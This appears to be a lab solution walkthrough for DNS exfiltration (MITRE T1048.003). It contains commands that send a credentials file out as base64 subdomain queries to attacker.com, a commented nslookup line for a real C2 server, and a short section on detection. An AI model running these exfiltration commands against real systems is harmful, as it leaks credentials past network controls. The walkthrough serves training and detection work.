# T1048.003 – DNS Exfiltration | Solution Walkthrough
**Difficulty:** Intermediate | **OS:** Linux | **MITRE:** T1048.003

## Step 1 – Start DNS Receiver
```bash
sudo python3 /opt/sensitive-data/dns_exfil_server.py 5353
# [*] DNS exfil receiver on UDP:5353
```

## Step 2 – Exfiltrate via DNS
```bash
bash /opt/sensitive-data/dns_exfil_client.sh /opt/sensitive-data/credentials.txt localhost 5353
# [*] DNS query: SEFDS1RJRll7RE5T.attacker.com → localhost
# [*] DNS query: X0VYRklMXzEyMzQ.attacker.com → localhost
```

## Step 3 – Manual DNS Exfiltration
```bash
# Encode single line:
encoded=$(echo "secret_data" | base64 | tr '+/' '-_' | tr -d '=')
echo "Query: ${encoded}.attacker.com"
# Real attack: nslookup ${encoded}.attacker.com <c2_dns_server>
```

## Why DNS Works
- DNS queries go OUT even when HTTP is blocked (DNS is usually allowed everywhere)
- Many firewalls don't inspect DNS payloads
- Looks like legitimate DNS traffic
- Attacker controls the authoritative DNS server for attacker.com

## Detection
- Monitor DNS query volume (high query rate = exfil)
- Look for long subdomains (base64 encoded data is 50+ chars)
- DNS RPZ (Response Policy Zones) to block suspicious domains
- Monitor non-standard DNS ports (anything other than 53)
